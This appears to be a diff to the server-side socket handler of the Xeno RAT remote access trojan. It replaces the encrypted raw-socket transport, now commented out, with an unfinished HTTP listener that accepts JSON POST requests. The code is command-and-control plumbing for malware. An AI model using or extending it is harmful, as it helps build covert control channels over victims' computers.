@@ -6,6 +6,10 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Net.Http;
+using System.Net;
+using System.IO;
+using System.Windows.Forms;
+using Newtonsoft.Json;
 
 namespace xeno_rat_server
 {
@@ -18,7 +22,8 @@ namespace xeno_rat_server
     public partial class SocketHandler
     {
         public Socket sock;
-        public HttpClient httpClient;
+        public HttpListener httpListener;
+        public HttpListenerContext httpTempContext;
         public byte[] EncryptionKey;
         public int socktimeout = 0;
         private bool doProtocolUpgrade = false;
@@ -28,6 +33,15 @@ namespace xeno_rat_server
             sock.NoDelay = true;
             EncryptionKey =_EncryptionKey;
 
+            // TODO
+            string url = "http://localhost:8080/api/data/";
+
+            // 创建HttpListener实例
+            HttpListener listener = new HttpListener();
+            listener.Prefixes.Add(url);
+            // 启动监听器
+            listener.Start();
+            httpListener = listener;
         }
 
 
@@ -129,67 +143,89 @@ namespace xeno_rat_server
                 throw new ArgumentNullException(nameof(data), "data can not be null!");
             }
 
+            // 发送响应
+            if (this.httpTempContext == null)
+            {
+                throw new ArgumentNullException(nameof(data), "SendAsync Failed, illegal state!");
+            }
+
             try
             {
-                if (doProtocolUpgrade) 
-                {
-                    byte[] compressedData = Compression.Compress(data);
-                    byte didCompress = 0;
-                    int orgLen = data.Length;
+                HttpListenerContext context = this.httpTempContext;
+                HttpListenerResponse response = context.Response;
+                response.ContentLength64 = data.Length;
+                Stream output = response.OutputStream;
+                await output.WriteAsync(data, 0, data.Length);
+                output.Close();
+                // 关闭连接
+                context.Response.Close();
 
-                    if (compressedData != null && compressedData.Length < orgLen)
-                    {
-                        data = compressedData;
-                        didCompress = 1;
-                    }
-                    byte[] header = new byte[] { didCompress };
-                    if (didCompress == 1)
-                    {
-                        header = Concat(header, IntToBytes(orgLen));
-                    }
-                    data = Concat(header, data);
-                    data = Encryption.Encrypt(data, EncryptionKey);
-                    data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
-                    byte[] size = IntToBytes(data.Length);
-                    data = Concat(size, data);
+                this.httpTempContext = null;
 
-                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
-                }
-                else 
-                {
-                    //var requestUrl = "https://172.23.192.1:8080/api/endpoint";
-
-                    //return await httpClient.PostAsync(requestUrl, new ByteArrayContent(data));
-
-                    data = Encryption.Encrypt(data, EncryptionKey);
-                    byte[] compressedData = Compression.Compress(data);
-                    byte didCompress = 0;
-                    int orgLen = data.Length;
-
-                    if (compressedData.Length < orgLen)
-                    {
-                        data = compressedData;
-                        didCompress = 1;
-                    }
-
-                    byte[] header = new byte[] { didCompress };
-                    if (didCompress == 1)
-                    {
-                        header = Concat(header, IntToBytes(orgLen));
-                    }
-
-                    data = Concat(header, data);
-                    byte[] size = IntToBytes(data.Length);
-                    data = Concat(size, data);
-
-                    return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
-                }
-
+                return true;
             }
-            catch
+             catch
             {
-                return false; // should probably disconnect
+                return false;
             }
+
+            //try
+            //{
+            //    if (doProtocolUpgrade) 
+            //    {
+            //        byte[] compressedData = Compression.Compress(data);
+            //        byte didCompress = 0;
+            //        int orgLen = data.Length;
+
+            //        if (compressedData != null && compressedData.Length < orgLen)
+            //        {
+            //            data = compressedData;
+            //            didCompress = 1;
+            //        }
+            //        byte[] header = new byte[] { didCompress };
+            //        if (didCompress == 1)
+            //        {
+            //            header = Concat(header, IntToBytes(orgLen));
+            //        }
+            //        data = Concat(header, data);
+            //        data = Encryption.Encrypt(data, EncryptionKey);
+            //        data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
+            //        byte[] size = IntToBytes(data.Length);
+            //        data = Concat(size, data);
+
+            //        return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
+            //    }
+            //    else 
+            //    {
+            //        data = Encryption.Encrypt(data, EncryptionKey);
+            //        byte[] compressedData = Compression.Compress(data);
+            //        byte didCompress = 0;
+            //        int orgLen = data.Length;
+
+            //        if (compressedData.Length < orgLen)
+            //        {
+            //            data = compressedData;
+            //            didCompress = 1;
+            //        }
+
+            //        byte[] header = new byte[] { didCompress };
+            //        if (didCompress == 1)
+            //        {
+            //            header = Concat(header, IntToBytes(orgLen));
+            //        }
+
+            //        data = Concat(header, data);
+            //        byte[] size = IntToBytes(data.Length);
+            //        data = Concat(size, data);
+
+            //        return (await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None)) != 0;
+            //    }
+
+            //}
+            //catch
+            //{
+            //    return false; // should probably disconnect
+            //}
         }
         public async Task<byte[]> ReceiveAsync()
         {
@@ -197,61 +233,97 @@ namespace xeno_rat_server
             {
                 while (true)
                 {
-                    byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
-                    if (length_data == null)
+                    HttpListenerContext context = await httpListener.GetContextAsync();
+                    HttpListenerRequest request = context.Request;
+                    this.httpTempContext = context;
+                    // 检查请求方法是否为POST
+                    if (request.HttpMethod == "POST")
                     {
-                        return null;//disconnect
-                    }
-                    int length = BytesToInt(length_data);
-                    byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
-                    if (data == null)
-                    {
-                        return null;//disconnect
-                    }
+                        String contextType = context.Request.ContentType;
+                        if (contextType == "application/json")
+                        {
+                            // 读取请求内容
+                            using (Stream body = request.InputStream)
+                            {
 
-                    header Header;
+                                using (StreamReader reader = new StreamReader(body, context.Request.ContentEncoding))
+                                {
+                                    string requestBody = reader.ReadToEnd();
+                                    dynamic json = JsonConvert.DeserializeObject(requestBody);
+                                    string dateCmdType = json["data"].ToString();
+                                    MessageBox.Show("Received POST request body: " + requestBody, "Server.SocketHandler");
+                                    
+                                    // 这里可以将 requestBody 反序列化为具体的对象进行处理
+                                }
+                                //using (MemoryStream ms = new MemoryStream())
+                                //{
+                                //    body.CopyTo(ms);
+                                //    byte[] requestData = ms.ToArray();
+                                //    return requestData;
+                                //    // 处理请求数据
+                                //    // 这里可以将 requestData 转换为具体的数据格式进行处理
+                                //}
+                            }
+                        }
 
-                    if (data[0] == 3)//protocol upgrade
-                    {
-                        if (!doProtocolUpgrade) 
-                        {
-                            doProtocolUpgrade = true;
-                        }
-                        data = BTruncate(data, 1);
-                        data = Encryption.Decrypt(data, EncryptionKey);
-                        if (data[0] == 2)
-                        {
-                            continue;
-                        }
-                        Header = ParseHeader(data);
-                        if (Header == null)
-                        {
-                            return null;//disconnect
-                        }
-                        data = BTruncate(data, Header.T_offset);
-                        if (Header.Compressed)
-                        {
-                            data = Compression.Decompress(data, Header.OriginalFileSize);
-                        }
-                        return data;
                     }
-                    else if (data[0] == 2)
-                    {
-                        continue;
-                    }
+                    return null;
 
-                    Header = ParseHeader(data);
-                    if (Header == null)
-                    {
-                        return null;//disconnect
-                    }
-                    data = BTruncate(data, Header.T_offset);
-                    if (Header.Compressed)
-                    {
-                        data = Compression.Decompress(data, Header.OriginalFileSize);
-                    }
-                    data = Encryption.Decrypt(data, EncryptionKey);
-                    return data;
+                    //byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
+                    //if (length_data == null)
+                    //{
+                    //    return null;//disconnect
+                    //}
+                    //int length = BytesToInt(length_data);
+                    //byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
+                    //if (data == null)
+                    //{
+                    //    return null;//disconnect
+                    //}
+
+                    //header Header;
+
+                    //if (data[0] == 3)//protocol upgrade
+                    //{
+                    //    if (!doProtocolUpgrade) 
+                    //    {
+                    //        doProtocolUpgrade = true;
+                    //    }
+                    //    data = BTruncate(data, 1);
+                    //    data = Encryption.Decrypt(data, EncryptionKey);
+                    //    if (data[0] == 2)
+                    //    {
+                    //        continue;
+                    //    }
+                    //    Header = ParseHeader(data);
+                    //    if (Header == null)
+                    //    {
+                    //        return null;//disconnect
+                    //    }
+                    //    data = BTruncate(data, Header.T_offset);
+                    //    if (Header.Compressed)
+                    //    {
+                    //        data = Compression.Decompress(data, Header.OriginalFileSize);
+                    //    }
+                    //    return data;
+                    //}
+                    //else if (data[0] == 2)
+                    //{
+                    //    continue;
+                    //}
+
+                    //Header = ParseHeader(data);
+                    //if (Header == null)
+                    //{
+                    //    return null;//disconnect
+                    //}
+                    //data = BTruncate(data, Header.T_offset);
+                    //if (Header.Compressed)
+                    //{
+                    //    data = Compression.Decompress(data, Header.OriginalFileSize);
+                    //}
+                    //data = Encryption.Decrypt(data, EncryptionKey);
+                    //return data;
 
                 }
             }
